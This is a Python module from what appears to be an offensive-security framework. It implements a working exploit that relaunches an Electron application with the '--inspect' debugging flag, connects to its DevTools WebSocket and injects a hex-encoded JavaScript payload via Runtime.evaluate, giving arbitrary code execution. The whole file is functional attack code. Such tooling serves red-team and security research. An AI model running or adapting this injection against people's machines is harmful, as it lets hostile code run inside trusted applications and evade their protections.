"""
inspect.py: Arbitrary Code Execution through Electron's '--inspect' flag
"""

import sys
import json
import time
import random
import logging
import requests
import websocket
import subprocess

from .base import Exploit


class Inspect(Exploit):

    def _spawn_executable(self) -> subprocess.Popen:
        """
        Spawn the exploitable application
        """
        return subprocess.Popen(
            [self._exploitable_application, f"--inspect={self._port}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )


    def _kill_if_already_running(self) -> None:
        """
        '--inspect' is only supported if a single instance of the application is running
        """
        if sys.platform == "win32":
            subprocess.run(["taskkill", "/IM", self._exploitable_application, "/F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(["killall", self._exploitable_application], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


    def _fetch_websocket_debugger_url(self) -> str:
        """
        Fetch the WebSocket Debugger URL
        """
        for _ in range(5):
            try:
                url = f"http://127.0.0.1:{self._port}/json/"
                response = requests.get(url, timeout=1)
                response_json = response.json()
                return response_json[0]["webSocketDebuggerUrl"]
            except requests.exceptions.ConnectionError:
                time.sleep(0.5)
                continue

        raise Exception(f"Failed to connect to {url}")


    def _execute_javascript(self, url: str) -> None:
        """
        Execute the JavaScript payload
        """

        wrapped_code = f"eval(Buffer.from('{self._javascript_payload.encode('utf-8').hex()}', 'hex').toString())"
        cmd_json = {
            "id": random.randint(1, 1000),
            "method": "Runtime.evaluate",
            "params": {
                "expression": wrapped_code,
                "objectGroup": "console",
                "includeCommandLineAPI": True,
                "silent": False,
                "returnByValue": False,
                "generatePreview": True,
                "userGesture": True,
                "awaitPromise": False,
                "replMode": True,
                "allowUnsafeEvalBlockedByCSP": False,
                "executionContextId": 1
            }
        }

        ws = websocket.create_connection(url)
        ws.send(json.dumps(cmd_json))
        ws.recv()
        ws.close()


    def run(self):
        """
        Run the exploit
        """
        logging.info(f"Running exploit on {self._exploitable_application}")
        logging.info(f"JavaScript payload: {self._javascript_payload}")

        # Kill the application if it's already running
        self._kill_if_already_running()

        # Spawn the exploitable application
        self._port   = random.randint(1024, 65535)
        self._result = self._spawn_executable()

        # Connect to debug
        debug_url = self._fetch_websocket_debugger_url()
        logging.info(f"Debug URL Established: {debug_url}")

        # Execute the JavaScript payload
        logging.info("Executing JavaScript payload")
        self._execute_javascript(debug_url)

        logging.info("Exploit complete, killing child process.")
        self._result.kill()